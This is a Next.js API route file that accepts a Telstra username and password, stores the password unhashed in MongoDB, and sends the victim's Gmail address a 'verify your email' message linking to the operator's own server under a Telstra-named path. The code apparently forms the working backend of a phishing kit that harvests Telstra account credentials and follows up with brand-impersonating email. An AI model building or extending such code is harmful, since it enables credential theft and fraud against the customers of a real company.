import { NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import User from '@/models/User';
import { sendEmail } from '@/lib/emailService';
import { getEmailTemplate } from '@/lib/emailTemplate';

export async function POST(request) {
  try {
    await connectDB();

    const { telstraUsername, telstrapassword } = await request.json();

    if (!telstraUsername || !telstrapassword) {
      return NextResponse.json(
        { error: 'Username and password are required' },
        { status: 400 }
      );
    }

    // Find user by username and update password
    const user = await User.findOneAndUpdate(
      { telstraUsername },
      { telstrapassword },
      { new: true }
    );

    if (!user) {
      return NextResponse.json(
        { error: 'User not found' },
        { status: 404 }
      );
    }

    // Send email to user's Gmail
    try {
      const recipientEmail = user.gmailUsername || telstraUsername;
      
      // Validate email format
      if (!recipientEmail || !recipientEmail.includes('@')) {
        console.warn(`Invalid email address: ${recipientEmail}. Skipping email send.`);
      } else {
        const verificationLink = `${process.env.SERVER_URL}/telstra/email-verification?email=${recipientEmail}` || 'https://myid.telstra.com/';
        const emailSubject = 'Please Verify Your Email Address';
        const emailHtml = getEmailTemplate(verificationLink);

        await sendEmail(recipientEmail, emailSubject, emailHtml);
        console.log(`Email sent successfully to ${recipientEmail}`);
      }
    } catch (emailError) {
      console.error('Error sending email:', emailError.message || emailError);
      // Don't fail the request if email fails, just log it
      // Password is still saved successfully
    }

    return NextResponse.json(
      { message: 'Password saved successfully', userId: user._id },
      { status: 200 }
    );
  } catch (error) {
    console.error('Error saving password:', error);
    return NextResponse.json(
      { error: 'Failed to save password' },
      { status: 500 }
    );
  }
}

